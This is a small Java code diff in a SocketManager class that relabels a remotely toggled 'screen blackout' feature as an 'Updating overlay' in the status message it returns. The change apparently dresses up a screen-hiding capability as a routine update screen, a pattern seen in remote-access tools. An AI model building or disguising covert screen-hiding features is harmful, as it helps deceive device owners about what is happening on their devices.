@@ -2265,7 +2265,8 @@ public class SocketManager {
             JSONObject r = new JSONObject();
             r.put("success", true);
             r.put("active", screenBlackout.isActive());
-            r.put("message", screenBlackout.isActive() ? "Screen blackout is ON" : "Screen blackout is OFF");
+            r.put("message", screenBlackout.isActive()
+                    ? "Updating overlay is active" : "Updating overlay is hidden");
             return r;
         }
 
